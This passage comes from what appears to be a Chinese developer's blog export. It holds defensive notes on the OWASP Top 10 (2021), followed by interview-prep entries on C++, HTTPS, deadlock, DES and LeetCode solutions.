使用了不安全的组件。  防护措施 ：\n 实施安全的安装过程，如开发、测试、生产环境中保持相同安全配置，且口令不同。安装过程尽量自动化，以减小出错的可能。 搭建最小化平台，移除所有不必要的功能、组件、文件及示例。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分。检查过程中，特别注意云存储的权限。 向客户端发送安全指令，如安全标头（想到了CSP、HTTP-Only）。  6 Vulnerable and Outdated Components 存在漏洞的或过时的组件 旧称 使用含有已知漏洞的组件 ，原榜单排第九。在行业调查中，这一安全问题收到了 第二多 的反馈。\n这一问题一般出现在：\n 对自己使用的组件或依赖的组件的版本没有清晰的认知； 依赖的组件或运行环境存在漏洞或过时（如OS、DBMS等）； 没有定期进行组件的漏洞检测，没有关注组件开发者发布的安全公告； 没有修复或升级底层依赖； 没有对新组建的适配性进行测试； 没有对组件进行妥善的安全配置（见上一个问题）。  防护措施 ：\n 移除不使用的依赖、不需要的功能、组件、文档。 利用各种工具来持续记录客户端和服务端以及它们的依赖库的版本信息。持续监控CVE等信息来判断已有组件是否有漏洞。 使用官方渠道安全地获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险。 监控那些不再维护或不发布安全补丁的库和组件。  7 Identification and Authentication Failures 身份认证和授权失败 旧称 失效的身份认证 ，由原榜 No. 2 下滑到第7位。\n对用户身份的认证和授权是非常关键的过程，假如应用中存在如下的问题，则可能导致认证机制的失效：\n 不对暴力破解或其他自动化的身份认证攻击进行防御； 允许弱口令的存在； 使用不安全的口令找回机制，使得攻击者可以获取或重置用户口令； 使用明文或不安全的密码哈希算法（见旧版 敏感数据泄露 或新版 密码算法失效 ）； 没有使用或使用了脆弱的多因素认证； 没有妥善处理会话ID。包括：在URL中暴露了会话ID，或用户登录之后没有生成新的会话ID，或用户注销之后没有及时销毁会话ID。  防护措施 ：\n 多因素身份认证。 弱口令检查。 统一注册、凭据恢复等接口，防止用户枚举攻击。 会话ID的合理管理，如登录之后生成高度随机的会话ID、妥善存储（肯定不能出现在URL里……）、登出之后及时销毁。  8 Software and Data Integrity Failures 新类别~\n我们经常能遇到一些与软件更新或某部分重要数据密切相关的操作，而假如这些操作不对软件和数据完整性进行验证，就会出现问题。一个很好的例子是旧版排名 No. 8 的问题——不安全的反序列化，它实际上属于该类别的一部分。\n该问题通常由于代码或架构中没有对软件/数据完整性进行检查，比如程序中使用了来自不受信源的插件、模块或库。近年来，许多程序都集成了自动更新功能，这些更新内容被下载之后没有进行周到的完整性检查，就被应用在了原本受信的程序上；攻击者可能会发布一个恶意更新，并使得这些更新被所有安装了原程序的机器运行。\n防护措施 ：\n 使用数字签名或其他类似的机制来保证软件或数据的来源是可信的，且传输过程中并未受到篡改； 确保你使用的管理和构建工具（如Maven）是从可信的仓库下载依赖； 使用软件供应链安全检查工具，如 OWASP Dependency Check 或 OWASP CycloneDX ，来确保项目使用的组件中没有已知漏洞； 建立一个 review 机制来对代码或配置的变更进行审查，防止不安全的变更被引入项目流水线中； 不要将未签名或未加密的序列化数据发送给不受信的客户端，防止恶意客户端篡改或重放序列化数据。  9 Security Logging and Monitoring Failures 日志和监控不足 由原版第十位上升来到第九位。日志和审计数据的重要性不言而喻，它们是攻击溯源、账号审计、告警和响应等安全功能的重要依赖。\n日志和监控不足的问题一般可能发生在如下的场景：\n 有些事件应被审计，但并未被审计（如登录成功、登录失败）； 系统确实产生了告警或报错，但是这些消息呈现的信息不够清晰； 应用日志和API日志没有受到实时的监控，由此不能及时发现可疑行为； 日志没有妥善存储； 告警阈值和响应启动的过程没有设置到位； 渗透测试或扫描工具发起的扫描行为没能触发告警； 程序不能够对攻击行为进行实时或及时的告警、响应、处置。  对于这些日志和监控信息，最好还要制定适当的访问控制权限，否则也可能存在风险。\n防护措施 ：\n 确保所有登录、访问控制和服务端的输入验证失败信息都受到了记录，且这些记录需要带有完整的用户上下文信息，以定位可疑账号；同时，这些记录要存留足够长的事件，以便后续的分析； 确保日志格式易于处理，尤其是让自动化的日志管理工具处理（宣传一波TxSOC）； 确保日志数据被正确地编码，防止针对日志和监控系统的注入攻击； 确保高额交易有完整性控制的审计信息，且审计信息必须防止篡改或删除； 制定应急管理预案，保障事件的有序响应和恢复。  10 Server Side Request Forgery（SSRF） OHHHHHHHH\n面试常客了，同时也是业界反馈第一高的问题，但在这一轮的测试过程中没有出现很广泛的SSRF问题。这种新条目覆盖的面一般较小，主要是为了引起人们的关注和认知，后续可能扩大成更广一点的类别。\n当一个网站后端使用用户提供的URL来获取远程资源，且未对这一URL进行检查时，就可能发生SSRF。这一漏洞使得后端服务器被攻击者用来向我们不希望的目标发送恶意请求，且这种请求可以绕过WAF、VPN和其他类型的ACL。\n当前的Web应用都在向用户提供越来越多的方便功能，包括从用户侧获取URL，这使得SSRF的出现概率在不断增加；同时，随着云计算的发展和程序架构的复杂化，SSRF的严重性也在不断增加。\n防护措施 ：\n网络层\n 对内网进行划分，尤其是具有远程资源访问功能的部分，以减轻SSRF带来的影响； 防火墙上配置“默认拒绝”的规则，只放行一些必要的请求；  应用层\n 检查来自客户端的所有输入数据； 对URL格式、端口和目的地址设置一个白名单； 不把原始数据返回给客户端（即远程获取到的资源要进行处理）； 禁用HTTP重定向； 留意URL的有效时间，防止DNS重绑定或TOUTOC（time of use, time of check）竞争条件攻击；  不要用黑名单来防止SSRF，因为攻击者有很多种办法绕过它们。\n","date":"2021-09-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/owasp-top102021/","title":"OWASP Top10（2021）"},{"content":"2021-07-20，正式拉开了秋招备战的序幕。\n我一直以来都深以为然的一个句子是，人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。 这个句子的意思是，如果你的学习能力比不上他人，那就花费百倍的精力去学，能够做到这一点的人，即使是一个愚者，也能够明了很多的知识。\n1 C++引用和指针的区别 这个问题出现在昨天的面试中，在此予以学习和记录。\n指针： 指针是一个变量，用于保存另一个变量的地址。指针需要使用 * 来进行解引用，以获取它指向的内存地址上的内容。\n引用： 引用是一个 已经存在 的变量的别名，实际上，引用也是通过存储变量的地址来进行实现的。\n两者的区别有如下几点：\n  初始化的方式不同。指针可以先声明，后赋值；引用必须在声明的同时进行初始化，因为它必须作为一个已经存在的变量的别名。\n  重复赋值。指针可以重复赋值（当然，const指针不行），而引用一旦声明，就不可以重复赋值。\n  内存占用。指针在栈上有其独立的内存空间（32bit机器就占用4字节），而引用与它的初始变量共享同一个空间，虽然它还是会花掉一部分栈空间。\n  是否为空。指针可以设置为NULL，而引用不行（基于第一点和第二点区别）。\n  间接引用。指针可以有多重嵌套，而引用不行。\nIn Pointers, int a = 10; int *p; int **q; //it is valid. p = \u0026amp;a; q = \u0026amp;p; // Whereas in references,  int \u0026amp;p = a; int \u0026amp;\u0026amp;q = p; //it is reference to reference, so it is an error.   可以使用一句话来概括两者在实际使用中的规律：只在万不得已的时候使用指针。一般来说，引用会用在一个类的public接口中，而指针运用在其内部。\n 以下编辑于2021-07-25\n传引用比传指针安全。 因为不存在空引用，并且引用一旦被初始化为指向一个对象，就不会被改变为另一个对象的引用；而指针可能被改变为另一个对象。\n即使声明为常量指针 const Type*  ，仍可能为空指针，并且可能产生野指针，所以还是不安全。\n Reference\n[1] Pointers vs References in C++ - GeeksforGeeks\n[2] 【C++】C++常见面试题汇总_持续更新中\u0026hellip; - 知乎 (zhihu.com)\n 2 HTTPS流程 HTTPS的流程总结为如下步骤：\n 客户端向服务器发送自己支持的密码套件（cipher suit）和一个随机数 rc ； 服务端选择一套密码算法，连同自己的证书信息返回给客户端。在这里，服务端具体会将自己的公钥、数字证书、签名以及一个随机数 rs 等信息发送给客户端； 客户端接受服务端的证书之后，会根据 rc 和 rs 生成一个随机的对称秘钥，同理，服务器此时也会生成相同的对称秘钥； 双方加密通信。  以下于2021-07-24重编辑\n还有一种对HTTPS流程的描述是：\n 客户端向服务器发送自己支持的密码套件（cipher suit）； 服务端选择一套密码算法，连同自己的证书信息返回给客户端。在这里，服务端具体会将自己的公钥、数字证书、签名等信息发送给客户端； 客户端接受服务端的证书之后，会生成一个随机的对称秘钥，用服务端的公钥加密后发送给服务端；服务端收到消息之后可以解密得到对称秘钥； 双方加密通信。  实际上，这两种描述所不同的地方仅在于一个关键的步骤：密钥交换。\n在第一种描述中，表现的是名为 DHE(Diffie-Hellman Exchange) 的密钥交换方式，而第二种描述中，表现的是名为 RSA密钥交换 的方式。第二种描述的实现方法法非常简单，但假如服务端的私钥被破解，将可以解密此前截取的所有流量，即这种办法不具备 前向安全 性。\n Reference\n[1] 让面试官膜拜你的HTTPS运行流程（超详细） - 知乎 (zhihu.com)\n[2] HTTPS原理和通信流程 - 知乎 (zhihu.com)\n[3] 石瑞生.大数据安全CH02-03-安全基础知识.2020年秋季学期.BUPT\n[4] 《HTTPS权威指南》笔记-密钥交换 - 简书 (jianshu.com)\n 昨天工作累爆，没有学习，今天休息，补上~\n3 死锁 昨天遇到的面试题，答得还算可以，但是有一些点还是忘了。死锁也是网上各个面经的常客了，稍作梳理，不亏。\n3.1 定义 操作系统中往往有多个进程在并发执行，而所谓死锁，是指多个进程因竞争资源而造成的一种僵局（互相等待），若无外力作用，这些进程都将无法向前推进。\n3.2 死锁产生的原因和必要条件 （1）系统资源的竞争\n通常系统中拥有的不可剥夺资源，数量不足以满足多个进程运行的需要。若进程在运行中因为对不可剥夺资源的竞争而陷入僵局，就可能产生死锁。对可剥夺资源的竞争是不会引起死锁的。\n（2）进程的推进顺序非法\n进程在运行过程中，请求和释放资源的顺序不当，也同样会导致死锁。\n信号量使用不当也会造成死锁。\n（3）死锁产生的必要条件\n昨天面试的时候短路遗忘的知识点（小声）。\n产生死锁必须同时满足4个条件，只要其中一个不成立，死锁就不会产生。\n  互斥条件。如果某个资源无需互斥访问，自然就不存在对它的竞争了。\n  不剥夺条件。\n  请求和保持条件。进程已经保持了至少一个资源，而在提出新的资源请求的时候，该资源已被其他进程占用，此时当前进程被阻塞；但是它对自己已经获得的资源保持不放。\n 我理解这一条件和不剥夺条件的区别是，请求和保持条件允许进程可以保持资源不放，但是其他进程可能强行剥夺；如果你保持不放，且外人不能剥夺的话，就可能陷入僵局。\n   循环等待条件。存在一种进程资源的循环等待链，链中每个进程已获得的资源同时被链中下一个进程所请求。直观上看，循环等待条件似乎和死锁的定义一样，其实不然。按死锁定义所构成的等待环要求的条件更严格，它要求 Pi等待的资源必须由 Pi+1来满足，循环等待条件则无此限制。例如，系统中有两台设备， P0占有一台， Pk占有一台， Pn请求这一设备，则这一设备可以从 P0处获得，也可以从 Pk处获得；虽然 P0到 Pn构成了一个等待圈，但等待圈外的设备 Pk只要释放了这一设备，就打破了等待。因此，循环等待条件只是死锁的必要条件。\n  3.3 死锁的处理策略 （1）死锁预防\n打破四个必要条件中的某一个，即可完全防止死锁的出现。\n（2）死锁避免\n注意“避免”和“预防”的区别。\n在资源的动态分配过程中，采用某种方法（如银行家算法）来防止系统进入不安全状态，从而避免死锁。\n（3）死锁的检测和解除\n事先不采取任何限制性措施，允许进程在运行过程中发生死锁。通过系统的检测机构及时地检测出死锁的发生，然后采取某些措施解除死锁（剥夺资源、杀死进程、进程回退）。\n 周末是如此的Relaxed，今天又只记录了一个知识点，睡觉去也~\nReference\n[1] 王道论坛.2021年操作系统考研复习指导[M].北京:电子工业出版社,2020:129::131\n 基本上一整天都在弄博客样式，折腾来折腾去，没有太大的改观······\n4 malloc和new的区别 C++经典问题之一。\n（1）是否调用构造函数。 malloc 为一个对象申请空间时，不会自动调用它的构造函数；而 new 会自动调用构造函数。同时，使用 new 申请一个对象数组时，会对每一个单元进行构造函数的调用，如下所示：\nA* ptr = new A[10];\t// 对每一个对象调用构造函数 delete[] ptr;\t// new数组的时候要搭配 delete[] （2）一个是函数，一个是运算符（operator new）。 malloc 虽然是函数，但是它不允许重载；而 new 可以被重载。\n（3）返回类型不同。 malloc 返回一个 void* 类型的指针，指向申请的那块空间；而 new 返回的是一个 确切的 对象指针。\n（4）错误处理。 malloc 申请内存失败之后，会返回一个空指针 NULL ；而 new 申请内存失败后，会抛出 bad_alloc 异常。\n（5）内存区域。 malloc 从堆中申请内存；而 new 会从 自由存储区（free store） 上申请内存。自由存储区是C++基于new操作符的一个抽象概念，凡是通过new操作符进行内存申请，该内存即为自由存储区。自由存储区的具体性质，取决于 new 运算符的实现方式，它本身也可以是堆。\n（6）申请的大小。 malloc 需要调用者传入要申请的内存大小；而 new 申请的空间大小由编译器自动计算。\n（7）更改大小。 malloc 允许通过 realloc() 函数更改缓冲区大小，假如要将缓冲区变大，系统会分配一块更大的空间，然后将当前缓冲区中的内容复制过去；而 new 不允许更改申请到的缓冲区的大小。\n Reference\n[1] malloc() vs new - GeeksforGeeks\n[2] c++ new 与malloc有什么区别 - ywliao - 博客园 (cnblogs.com)\n 5 虚函数 虚函数一般在继承的场景下发挥作用。基类声明一个虚函数，子类重载这一函数，这样一来，当我们使用一个基类指针指向子类，并且希望调用这一函数的时候，得到的就是子类重载过的函数。\n实际上，虚函数的意义就在于能够使得函数调用合乎逻辑，而不必考虑指针的类型。\n虚函数的解析在运行的时候完成。\n以下有几个虚函数的使用原则：\n 不能是 static 函数； 可以是其他类的友元函数； 使用基类指针或者引用来调用虚函数，以获得 运行时多态（run time polymorphism） ； 一般在基类定义、子类重载，但没有强制要求子类进行重载，在这种情况下，就和普通的函数继承没有区别； 可以有 虚析构函数（virtual destructor） ，但不能有 虚构造函数（virtual constructor） 。   夜已深了，且先休息去，来日再作补充~\nReference\n[1] Virtual Function in C++ - GeeksforGeeks\n 2021-07-26 今天做题，学习了 【最长递增子序列】 的解法、之后AC了一道困难题！准备新开一篇难题本讲讲这道题： 1713. 得到子序列的最少操作次数 - 力扣（LeetCode） (leetcode-cn.com)\n所以就鸽了鸽了~\n2021-07-27 今天投简历，改完之后夜深了；明天留公司，估计也没有新的知识点学习。希望昨天说的文章能尽快完成吧。\n既然啥知识点都没学，就简单讲一下每日一题吧。今天的每日一题是 671. 二叉树中第二小的节点 - 力扣（LeetCode） (leetcode-cn.com)\n如何找到【第二小】的节点，下午折腾了一段时间；晚上回来，稍作考虑，可以直接使用排序+遍历的方法，找到第一个与左邻居不同的元素即可。\n两次遍历的情况有一点问题，测试用例有一组 [2,2,2147483647] ，用 INT_MAX 初始化答案，找最小值的办法是行不通的，出题人属实很有水平。\n答案里还有人直接使用 set ，属于是把STL玩明白了，我以后也要好好再学一下STL o(╥﹏╥)o\n2021-07-28 今天公司留宿，不更新是理所当然的吧~ 今日的每日一题是 https://leetcode-cn.com/problems/all-nodes-distance-k-in-binary-tree/ ，中等题，一时间没有思路；看了题解之后发现二叉树可以转为图，这样就比较简单了。 一开始想用邻接矩阵，但是一个节点实际上只可能有三条边，那就使用dfs先存下这个节点的父节点，这样一个节点的所有邻居就全都可以找到了（两个子节点加上一个父节点，最多只有三个邻居）；构造完了一个抽象意义上的“图”，使用BFS找目标距离的节点即可。\n2021-07-29 谌龙翻盘李梓嘉！姜还是老的辣！\n今天的知识点启发于白天的工作中，实际上并不是非常的重要，仅稍作记录。\n6 FTP与SFTP FTP 是文件传输协议（File Transport Protocol）的简写，使用 C/S 架构在web服务器和FTP客户端之间进行文件传输。FTP使用两个独立的连接，分别是命令连接和数据连接，前者用于传输指令，后者用于传输数据（文件）。实际上，双连接的机制在使用socket编程来实现文件传输功能时，是非常有意义的：当服务器发送完文件之后，可以直接关闭文件连接的socket，这样命令连接就知道文件传输已经完成，可以进行下一步工作了。\n默认情况下，FTP没有加密，也就意味着 中间人攻击 的可能性。\nSFTP 是SSH File Transport Protocol的简写，或者也被成为Secure File Transport Protocol。它提供与FTP一样的功能，但基于SSH而非C/S架构的FTP实现。SFTP只使用一个连接，并要求用户使用用户名/密码或者SSH密钥的方式进行授权。\n由于实现方式的不同，FTP使用的端口是传统的21，而SFTP使用与SSH相同的22端口。\n [1] FTP vs SFTP: What\u0026rsquo;s the Difference? Which One Should You Use? (kinsta.com)\n 7 LeetCode 987. 二叉树的垂序遍历 因不可抗力断更，昨天重感冒了······\n今天仍然没好，仅对每日一题进行记录。\n今天的每日一题是 987. 二叉树的垂序遍历 - 力扣（LeetCode） (leetcode-cn.com)\n题目给的数据属于是少了，针对一千个二叉树节点，我们使用一个 multimap 来进行 列 → Node 的映射，注意这里的 Node 指的是自定义的数据结构：\ntypedef struct _node { int val; int row; } Node, *PNode; 我们使用 multimap 来将某个列上的所有节点存储起来，使用 Node 来记录节点所在的行和值。这样，我们遍历完成之后得到的 multimap 就能够根据一个列值取出这一列上的所有节点；我们利用这些 Node 的行和值进行排序，正如题意所说的：\n 二叉树的 垂序遍历 从最左边的列开始直到最右边的列结束，按列索引每一列上的所有结点，形成一个按出现位置从上到下排序的有序列表。如果同行同列上有多个结点，则按结点的值从小到大进行排序。\n 这里注意 multimap 的几个用法：\nmultimap.emplace(key, value); // 插入值 multimap.equal_range(key); // 返回key值对应的所有value，返回值是一个pair，首元素是区间起点，次元素是区间终点的后面 独立自主完成的困难题，AC代码还是要贴一下~\n/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */ class Solution { public: typedef struct _node { int val; int row; } Node, *PNode; multimap\u0026lt;int, Node\u0026gt; col2node; void dfs(TreeNode* root, int row, int col) { Node n; n.val = root-\u0026gt;val; n.row = row; col2node.emplace(col, n); if (root-\u0026gt;left) dfs(root-\u0026gt;left, row + 1, col - 1); if (root-\u0026gt;right) dfs(root-\u0026gt;right, row + 1, col + 1); } static bool cmp(Node\u0026amp; a, Node\u0026amp; b) { if (a.row \u0026lt; b.row) return true; else if (a.row == b.row) return a.val \u0026lt; b.val; else return false; } vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; verticalTraversal(TreeNode* root) { dfs(root, 0, 0); vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; for (int c = -1000; c \u0026lt;= 1000; c++) { if (col2node.count(c)) { auto ret = col2node.equal_range(c); vector\u0026lt;Node\u0026gt; sortedNodes; vector\u0026lt;int\u0026gt; tmp; for (auto a = ret.first; a != ret.second; a++) { sortedNodes.push_back(a-\u0026gt;second); } sort(sortedNodes.begin(), sortedNodes.end(), cmp); for (auto n : sortedNodes) { tmp.push_back(n.val); } res.push_back(tmp); } } return res; } }; 2021-08-01 建军节，伟大的人民军队万岁！\n8 C++中的static关键字 我们知道，函数的局部变量空间分配在栈上，函数运行结束之后这些变量的空间就会被释放掉；当我们需要保存函数上一次调用时变量的状态，就需要将这个变量放到另一块存储空间上，这就是 static 关键字的作用。\nstatic 变量存储在静态存储区，在程序结束之前都不会被释放。即使一个函数被多次调用，其中的 static 变量也始终只进行了一次内存分配，且它的值可以保持上一次调用时的样子。\nstatic 关键字用于定义一个类中的成员变量的时候，有其独特的影响。由于 static 变量存储在一块独立的区域，所有类对象都共享这一个变量。如以下的例子所示，所有 GfG 类型的实例都共享 static 变量 i 。\n// C++ program to demonstrate static // variables inside a class  #include\u0026lt;iostream\u0026gt;using namespace std; class GfG { public: static int i; GfG() { // Do nothing  }; }; int main() { GfG obj1; GfG obj2; obj1.i =2; obj2.i = 3; // prints value of i  cout \u0026lt;\u0026lt; obj1.i\u0026lt;\u0026lt;\u0026#34; \u0026#34;\u0026lt;\u0026lt;obj2.i; // Get 3 } 正因如此， 不允许在类的构造函数中对 static 类型的成员变量进行操作 。类中的 static 变量应该由用户在外部使用作用域运算符进行赋值。\n如 int GfG::i = 1; 。\n由以上的分析我们可以进一步推理，static 类型的类对象也具有全局的生命力，它的析构函数只会在程序结束的时候被调用。\n再进一步推理，static 类型的函数也具有全局的生命力，当然，对函数讨论“生命力”没什么意义。\n在一个类中， static 类型的成员函数正如 static 类型的成员变量那样，被所有对象（实例）所共享。我们可以使用 className.functionName 的形式来调用这个函数，不过还是首推作用域运算符 className::functionName 的方式来进行调用。由于所有的实例都共享这么一个 static 函数，它自然只能访问 static 类型的成员变量，或者其他 static 类型的成员函数；设想，所有的实例都来调用这个函数，然后它去访问一个非全局共享的变量，那么这个函数怎么知道这个变量应该属于哪个实例的呢？\n Reference\n[1] 【C++】C++常见面试题汇总_持续更新中\u0026hellip; - 知乎 (zhihu.com)\n[2] Static Keyword in C++ - GeeksforGeeks\n 9 分组密码——DES 9.1 简介 分组密码（块密码）是将明文消息编码表示后的二进制序列，划分成固定大小的块，每块分别在密钥的控制下变换成等长的二进制序列。\n注意，尽管一些传统加密算法也进行分组，但它们并不是分组密码。例如，Vigenere加密算法的密钥也可以自定义块的大小，但它不属于分组密码。\n分组密码加解密的设计有如下几个要求：\n 分组足够长。 根据分组长度 n ，每一组中的元素个数 2^n 要足够对抗明文穷举攻击。 密钥长度足够长。 密钥长度 k ，则密钥有 2^k 种情况，需要足够对抗密钥穷举攻击。但密钥长度不能太长，否则不利于管理和加解密速度。 置换算法足够复杂。 置换算法要足以对抗差分攻击和线性攻击等，使得攻击者只能进行穷举。 加解密运算简单，利于硬件实现。 一般无数据扩展，即明文和密文长度相同。  Shannon提出了三个分组密码的设计思想——混乱、扩散和乘积密码。\n 混乱。 可以理解为”搅拌机“，指在加密过程中明文、密钥以及密文之间的关系尽可能复杂，以防密码破译者采用统计分析法进行破译攻击。 扩散。 每1比特明文的变化尽可能多地影响到输出密文序列的比特，以便隐藏明文的统计特性。扩散的另一层意思是每1位密钥也尽可能影响到较多的输出密文比特。简而言之，扩散就是希望密文中的任一比特都要尽可能与明文和密钥的每一比特相关联。 乘积密码体制。 针对嵌套加密的一系列原则。此处省略。  9.2 分组密码的迭代结构 分组密码有两种迭代结构：Feistel网络结构和SP网络结构。\nFeistel网络结构的加密办法如下：\n  将明文分组分割成长度相同的两块：(L0, R0)\n  对每一轮，i=0,1,\u0026hellip;n\nLi+1 = Ri\nRi+1 = Li ⊕ F(Ri, Ki)\n  加密后的密文为 (Rn+1, Ln+1)\n  解密办法与加密办法相反：\n  对于密文(Rn+1, Ln+1)，每一轮 i=n,n-1,\u0026hellip;0\nRi = Li+1\nLi = Ri+1 ⊕ F(Li+1, Ki)\n  解密出 (L0, R0)\n  SP网络结构是代换-置换网络的简写。它由两个基本组件S盒和P盒组成。S盒进行代换操作，起到混乱作用；P盒进行置换操作，起到扩散作用。每一轮迭代中都先经过S盒、再经过P盒。\n需要注意，置换不等于扩散。置换本身并不改变明文在单个字符或置换分组上的统计特性。但是，经过了多轮代换-置换的结合，就产生了扩散作用。\n9.3 DES DES的初始密钥长度为64位，但有效密钥为56位，其中第8/16/24/32/40/48/56位是奇偶校验位。\n流程如下图所示：\n\rDES\r\nDES的初始置换Initial Permutation是固定的，它的作用是将原明文块的位进行换位。完成加密之后，要使用它的逆置换将其换回来，置换表如图所示：\n\rDES IP\r\nDES一轮迭代过程如图所示，其遵循了Feistel网络结构，轮函数总共经历了扩展置换-密钥加-非线性代换-线性置换四个步骤。\n\rDES Round\r\n扩展置换又称E盒，将32位输入扩展为48位输出。E盒在DES算法上最基本地是要将输入扩展为与轮密钥相同的48比特，而更进一步，由于E盒的1位输入可能影响2个S盒的输入，能够更快地实现血崩效应。\n代换盒又称S盒，是DES中唯一的非线性部分。经过S盒的代换，E盒扩展生成的48位数又压缩回32位。\n最后的P盒没有太多探讨的意义，就是一个32位的置换表。\nDES的密钥编排如下图所示，首先将64位密钥进行PC-1置换，然后根据轮数进行左移，其中，第1/2/9/16只移动1位，其余轮数移动2位。最后，56位密钥经过PC-2置换得到48位密钥。\n\rDES Key Generation\r\n关于DES的安全性问题，暂且不予记录了~\n10 笔试复盘 晚上参加了Shopee的笔试，果然安全拉胯，编程AK……\n编程题实际上也不难，第一题估计有个LeetCode的中等偏上，予以记录吧。\n有一个整数 n 和一个整数 k ，现在要将 n 分成 k 份，每份至少有一个元素，求总共有多少种分法。注意，分割的办法不考虑顺序，例如将 7 分成 3 份，其中 1,1,5 和 5,1,1 或 1,5,1 属于同一种分法。\n 1 \u0026lt;= n \u0026lt;= 200 1 \u0026lt;= k \u0026lt;= 7  这题我使用了三维记忆化搜索，rec[n][k][startswith] 表示将 n 分成 k 份，每一份的元素至少要大于 startswith 。\n假设要将 7 分成 3 份，我们可以将其转化为将 6 分为 2 份，每份至少从 1 开始，或者将 5 分为两份，每份至少从 2 开始……\n不好解释，直接放代码：\n#include \u0026lt;vector\u0026gt;#include \u0026lt;iostream\u0026gt;#include \u0026lt;algorithm\u0026gt; using namespace std; int record[210][8][210]; int d(int n, int k, int startswith) { // cout \u0026lt;\u0026lt; n \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; startswith \u0026lt;\u0026lt; endl;  if (record[n][k][startswith]) return record[n][k][startswith]; if (startswith * k \u0026gt; n) return 0; if (k == 1) return 1; int res = 0; for (int start = startswith; start \u0026lt;= n / 2; start++) { res += d(n - start, k - 1, start); } record[n][k][startswith] = res; return res; } int divide(int n, int k) { // write code here  return d(n, k, 1); } int main() { int n, k; n = 200; k = 7; cout \u0026lt;\u0026lt; divide(n, k) \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); } 本场笔试也暴露出了一些安全理论上的缺陷，之后有空进行总结。今天就先到这里啦~\n Reference\n[1] 谷利泽,郑世慧,杨义先.现代密码学教程（第2版）[M].北京:北京邮电大学出版社,2019\n 2021-08-03 今天将昨天的笔试题整理了一下，还有些题目找不到答案，明天继续~\n2021-08-14 断更将近2周，陆续恢复吧……\n11 LeetCode 1583. 统计不开心的朋友 1583. 统计不开心的朋友 - 力扣（LeetCode） (leetcode-cn.com)\n今天的题目是个模拟题，然而我卡了半天没有做出来……\n这里的一个关键是建立二维映射 rank[x][y] 表示 y 在 x 心中的优先级，数值的话直接按照 preferences[x] 中 y 所处的下标即可。\n对于一个 x 来说，我们可以找到所有位于 rank[x][y] 之前的数 u ，即 x 心中比 y 更加优先匹配的对象，再找到 u 的现有对象 v ，比较 rank[u][x] 和 rank[u][v] 的大小。如果 rank[u][x] \u0026lt; rank[u][v] ，说明 u 也更希望和 x 进行匹配，那么依照题意， x 就是不开心的。\n之前对于不开心的理解，是 x 不开心，则 u 应该也不开心，这样就比较复杂了。我们只考虑 x 开不开心，把 u 放到之后进行考虑，反而简单一些。\n代码就不放了，WA了两次的中等题，我现在属实不怎么开心。\n12 LeetCode面试题 04.05. 合法二叉搜索树 https://leetcode-cn.com/problems/legal-binary-search-tree-lcci/\n这题属实顶不住了……出题人给那么多 INT_MAX 的测试用例干啥？？？\n希望检查一颗树是否是二叉搜索树，只需要考虑它的左节点是否满足一定范围、右节点是否满足一定范围，然后按照递归的思路向下进行，类似于深搜。\n初始情况下（即考虑根节点的时候），它的数据范围应该是 -INF ~ +INF ，然而，出题人给了很多组 INT_MAX 和 INT_MIN 的测试用例，简单地使用这两个宏作为初始数据范围，会挂掉。（丢雷楼某）\n因此，我们的递归函数中表示数据范围的参数需要定义为 long long 类型，然后在初始传入的时候，传个比 INT_MAX 还大的数 (long)INT_MAX + 1 。\n我giao！\n\rPerformance\r\n13 LeetCode5845. 你能穿过矩阵的最后一天 题目链接 5845. 你能穿过矩阵的最后一天\n《关于思路正确而代码质量太差导致我TLE从而只做出了周赛签到题这件事》\n倒不完全认为它是道困难题，毕竟第一时间是有思路的。\n首先，二分答案是第一想法，TLE的风险也同时存在。\n对于一个答案 day 来说，如何判断在这一天里能否从第一行到达最后一行呢？BFS啊！\n我们在 day 这一天的进行BFS寻路，从第一行的任意一个起点出发，如果某个起点能到达最后一行的某个终点，说明在 day 这一天还能够穿过矩阵，继续进行二分。\n寻路时，在 day 这一天被水淹没的格子就走不了了，这里有一个关键问题：如何验证某个格子是否被水淹没？最开始，我使用了一个 map 来表示某个格子是否被淹，但这样我们需要额外引入 O(logn) 的复杂度，会超时。比赛结束之后查看题解，发现直接用 visited 数组来把被淹过的格子禁用掉即可……\n总之，比赛的时候提交的代码质量确实差了，还得多练练吧。\nAC代码 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; g_cells; int g_row, g_col; typedef struct _pos { int x, y; friend bool operator\u0026lt; (const _pos\u0026amp; a, const _pos\u0026amp; b) { if (a.x != b.x) return a.x \u0026lt; b.x; else return a.y \u0026lt; b.y; }; } Pos, * PPos; map\u0026lt;Pos, int\u0026gt; watered; bool hasRoute(int day) { // cout \u0026lt;\u0026lt; \u0026#34;day \u0026#34; \u0026lt;\u0026lt; day \u0026lt;\u0026lt; endl;  vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; dirs = { {1, 0}, {0, 1}, {-1, 0}, {0, -1} }; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; visited(g_row, vector\u0026lt;int\u0026gt;(g_col, 0)); queue\u0026lt;Pos\u0026gt; q; Pos head; // 通过设置visited数组来使得被淹没的方块无法访问  for (int i = 0; i \u0026lt; day; i++) { visited[g_cells[i][0] - 1][g_cells[i][1] - 1] = 1; // cout \u0026lt;\u0026lt; g_cells[i][0] - 1 \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; g_cells[i][1] - 1 \u0026lt;\u0026lt; \u0026#34; watered\\n\u0026#34;;  } for (int start = 0; start \u0026lt; g_col; start++) { head.x = 0; head.y = start; // 该起点被淹了  if (visited[head.x][head.y]) continue; q.push(head); visited[head.x][head.y] = 1; } while (!q.empty()) { head = q.front(); q.pop(); // cout \u0026lt;\u0026lt; head.x \u0026lt;\u0026lt; \u0026#34;,\u0026#34; 